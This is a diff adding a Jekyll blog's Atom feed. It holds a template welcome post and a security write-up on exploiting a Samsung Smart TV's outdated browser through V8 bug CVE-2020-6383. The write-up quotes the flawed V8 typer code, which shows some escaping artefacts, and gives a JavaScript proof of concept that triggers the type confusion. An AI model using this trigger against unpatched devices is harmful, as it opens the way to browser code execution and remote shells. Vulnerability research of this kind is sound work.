@@ -1,0 +1,1309 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-27T01:42:02-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">iam.chi</title><subtitle>Security Research | Writeups | Words are my own.</subtitle><author><name>Chi Tran</name></author><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2023/01/26/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2023-01-26T23:29:23-06:00</published><updated>2023-01-26T23:29:23-06:00</updated><id>http://localhost:4000/jekyll/update/2023/01/26/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2023/01/26/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>author</name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Pwning the Samsung TV</title><link href="http://localhost:4000/research/2022/01/28/pwning-the-samsung-tv.html" rel="alternate" type="text/html" title="Pwning the Samsung TV" /><published>2022-01-28T00:00:00-06:00</published><updated>2022-01-28T00:00:00-06:00</updated><id>http://localhost:4000/research/2022/01/28/pwning-the-samsung-tv</id><content type="html" xml:base="http://localhost:4000/research/2022/01/28/pwning-the-samsung-tv.html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;Next, following up on the “failed” Pwn2Own 2021 series, this blog post will be talking about the vulnerability found on Samsung TV - a Pwn2Own 2021 target.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-summary&quot;&gt;Vulnerability Summary&lt;/h2&gt;
+
+&lt;p&gt;The default browser of Samsung Smart TV is chromium-based with obsolete version. So we use 1-day CVE-2020-6383 to exploit this device over this default browser. When user browse malicious content on the device’s browser, we can use this bug to run shellcode and obtain reverse shell connection from device.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-detail&quot;&gt;Vulnerability Detail&lt;/h2&gt;
+
+&lt;p&gt;The vulnerability is in JavaScript engine (V8) that used by default browser. When JS engine try to optimize this pattern of JS code:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;The&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Visitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TypeInductionVariablePhi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;called&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Visitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TypeInductionVariablePhi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;typer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                                  &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;typer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;maybe&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// The addition or subtraction could still produce a NaN, if the integer&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// ranges touch infinity.&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resultant&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arithmetic&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;typer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NumberAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;typer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NumberSubtract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                                        &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;maybe&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resultant&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Maybe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// \*\*\* 1 \*\*\*&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arithmetic&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;DCHECK&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_EQ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kSubtraction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arithmetic&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;increment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer\_-&amp;gt;cache\_-&amp;gt;kInteger; // \*\*\* 2 \*\*\*&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The code assumes that when the &lt;strong&gt;increment&lt;/strong&gt; variable can be both positive and negative, the result type of &lt;strong&gt;i&lt;/strong&gt; will be &lt;strong&gt;kInteger&lt;/strong&gt; (which doesn’t include &lt;strong&gt;NaN&lt;/strong&gt;). However, since the value of &lt;strong&gt;increment&lt;/strong&gt; can be changed from inside the loop body, it’s possible, for example, to set &lt;strong&gt;i = 0&lt;/strong&gt; and &lt;strong&gt;increment = -Infinity&lt;/strong&gt;, and then set &lt;strong&gt;increment&lt;/strong&gt; to &lt;strong&gt;+Infinity&lt;/strong&gt; inside the for loop. This will make &lt;strong&gt;i&lt;/strong&gt; become &lt;strong&gt;NaN&lt;/strong&gt; in the next iteration of the loop. This leads to type mismatch of variable i, engine thinks its type is &lt;strong&gt;kInteger&lt;/strong&gt; (not include &lt;strong&gt;NaN&lt;/strong&gt;) but it can be &lt;strong&gt;NaN&lt;/strong&gt;. Here is the proof-of-concept:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
